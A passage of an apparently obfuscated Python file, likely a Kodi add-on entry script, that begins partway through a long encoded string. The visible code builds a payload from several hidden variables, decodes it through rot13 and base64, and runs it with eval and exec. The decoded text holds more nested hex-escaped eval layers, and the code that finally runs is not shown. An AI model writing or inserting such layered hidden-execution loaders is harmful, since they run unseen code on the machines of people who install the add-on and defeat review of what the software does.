SYARReA2fiFwZ4EGqyAxH5pl9Aq3yOY0AeqzAMHF8mX00mo3AYnmMLp1I0IzfiBRScZKq2Al85MzMmYmyOGKyCpwLeGGDmnF9UX1H4rF9lX2xmoRjiBF9dY3tiA0quY0AiDlginwyzpP8iY0ViY2yFYl9zo0piLaZiX3OlYl9yIJx5qxxeXmReATMkpSbaQDc6nJ9hVQ0tW1k4AmWprQMzKUt3ASk4ZmSprQZmWj0XozIiVQ0tMKMuoPtaKUt2Zyk4AwyprQMyKUt2ZIk4AmAprQLmKUt2BIk4AwyprQWyKUt3AIk4AzIprQL4KUt2AIk4AmuprQMwKUt2BIk4AwMprQp5KUtlBSk4AzEprQMzKUt3Zyk4AmOprQL4KUt2AIk4AmIprQpmKUtlBIk4ZwOprQWSKUt2ASk4AwIprQLmKUt2Eyk4AwEprQL1KUtlBSk4ZwxaXFNeVTI2LJjbW1k4AwAprQMzKUt2ASk4AwIprQLmKUt3Z1k4ZzIprQL0KUt2AIk4AwAprQMzKUt2ASk4AwIprQV4KUt3ASk4AmWprQL5KUt2MIk4AwyprQp0KUt3BIk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXFNeVTI2LJjbW1k4AwWprQL5KUt2MIk4AwSprQpmKUt2Z1k4AwyprQL5KUtlMIk4AmIprQMyKUt2BSk4AwIprQp4KUt2L1k4AwyprQL2KUt3BIk4ZwuprQMzKUt3Zyk4AwSprQLmKUt2L1k4AwIprQV5KUtlEIk4AwEprQL1KUt2Z1k4AxMprQL0KUt2AIk4ZwuprQV5WlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AzWprQL1KUt3BIk4AzEprQLkKUt2Lyk4AwIprQplKUtlZSk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXD0XMKMuoPuwo21jnJkyXUcfnJVhMTIwo21jpzImpluvLKAyAwDhLwL0MTIwo2EyXTI2LJjbW1k4AzIprQL1KUt2MvpcXFxfWmkmqUWcozp+WljaMKuyLlpcXD=='
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))

if __name__ == '__main__':
    router(sys.argv[2][1:])
